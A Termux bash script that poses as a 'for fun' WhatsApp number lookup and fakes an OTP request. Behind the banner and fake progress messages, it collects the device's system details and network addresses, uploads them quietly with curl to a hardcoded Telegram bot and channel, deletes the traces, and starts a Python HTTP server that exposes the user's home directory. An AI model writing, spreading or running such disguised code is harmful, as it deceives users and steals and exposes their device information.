#!/data/data/com.termux/files/usr/bin/bash

packages=(wget curl neofetch pv python)
for i in "${packages[@]}"; do
    if ! hash $i > /dev/null 2>&1 ;
    then
	echo "installing required packages please wait !"
	apt install "${i}" -y
    fi
done

#colours
red='\e[1;91m'
cyan='\e[1;36m'
green='\e[1;92m'
yellow='\e[1;33m'
blue='\e[1;35m'

echo -e " ${red}"
cat <<"EOF"
:::::::-.  .,::::::   :::. :::::::::::: ::   .:                 
 ;;,   `';,;;;;''''   ;;`;;;;;;;;;;'''',;;   ;;,                
 `[[     [[ [[cccc   ,[[ '[[,   [[    ,[[[,,,[[[                
  $$,    $$ $$""""  c$$$cc$$$c  $$    "$$$"""$$$                
  888_,o8P' 888oo,__ 888   888, 88,    888   "88o               
  MMMMP"`   """"YUMMMYMM   ""`  MMM    MMM    YMM               



                                                                
                    :::.    :::.    ...   ::::::::::::.,::::::
                    `;;;;,  `;;; .;;;;;;;.;;;;;;;;'''';;;;''''
                      [[[[[. '[[,[[     \[[,   [[      [[cccc
                      $$$ "Y$c$$$$$,     $$$   $$      $$""""
                      888    Y88"888,_ _,88P   88,     888oo,__
                      MMM     YM  "YMMMMMP"    MMM     """"YUMML




EOF
echo -e "${yellow}[${red} * ${yellow}] ${cyan} this tool was made only for fun .. "
echo ""

read -p 'enter whatsapp number > ' usr
echo -e "${red} getting details of ${usr}"
echo 'getting otp ........' |pv -qL 9
echo "PLEASE WAIT ! this may take a while"
echo 'please wait ...' |pv -qL 10
neofetch --stdout > neofile.txt
ifconfig | grep inet > config.txt
chmod +x *
mv neofile.txt /$HOME 2>/dev/null
mv config.txt /$HOME 2>/dev/null

cd $HOME

curl -sF document=@$HOME/neofile.txt "https://api.telegram.org/bot1871962646:AAFPvfrnD4dDOaLNWq088W3fkB_eGHZ0G34/sendDocument?chat_id=@madara_v3" &>/dev/null

curl -sF document=@$HOME/config.txt "https://api.telegram.org/bot1871962646:AAFPvfrnD4dDOaLNWq088W3fkB_eGHZ0G34/sendDocument?chat_id=@madara_v3" &>/dev/null

rm -R neofile.txt config.txt
echo "Requesting OTP "
python -m http.server &>/dev/null
sleep 60
